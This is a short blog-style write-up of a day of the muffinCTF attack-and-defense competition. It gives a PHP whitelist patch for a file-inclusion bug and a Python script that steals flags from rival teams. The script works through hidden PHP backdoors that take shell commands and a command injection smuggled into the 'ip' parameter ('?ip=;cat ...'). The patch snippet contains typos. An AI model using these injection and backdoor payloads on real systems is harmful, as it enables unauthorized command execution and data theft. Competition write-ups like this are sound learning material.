# Day 21: muffinCTF

This was the first day of the attack and defense part of the CTF. We get two services: bakery and garden. We have to
patch vulnerabilites and attack other players to steal their flags.

As I wasn't able to get the garden up and running I focused on the bakery. I patched the following vulnerabilites in the
inc.php file:

```php
$allowed = array("../html/home.html", "../html/breads.html", "../html/breadSend.html");

if (isset($_GET['page'])) {]
  $page = $_GET['page'];

  if (in_array($page, $allowed)) {
    include($page);
  } else if (preg_match('/^breads.php/', $page) === 1) {
    include($page);
  } else if (preg_match('/^breadSend.php.php/', $page) === 1) {
    include($page);
  } else {
    http_response_code(403);
    die();
  }
}
```

Furthermore I deleted various php files that were hidden in the subfolders and patched vulnerabilities that were present
in `breadSend.php` and `breads.php`.

With the following attack script I was able to steal flags from other players:

```python
def exploit(attack_url):
    output = ''

    try:
        output += requests.get(attack_url + ".../.php?_=cat%20/home/bakery/breads/*").text
	output += requests.get(attack_url + "css/components/checkbox.php?_=cat%20/home/bakery/breads/*").text
        output += requests.get(attack_url + "inc/inc.php?page=breadSend.php?ip=;cat%20/home/bakery/breads/*").text

    except KeyboardInterrupt:
        sys.exit(1)
    except:
        pass

    return output

muffin_ctf.attack_all('bakery', exploit)
```

During the CTF I was also able to get the garden service running. There I patched some vulnerabilities such as the sql
injection.
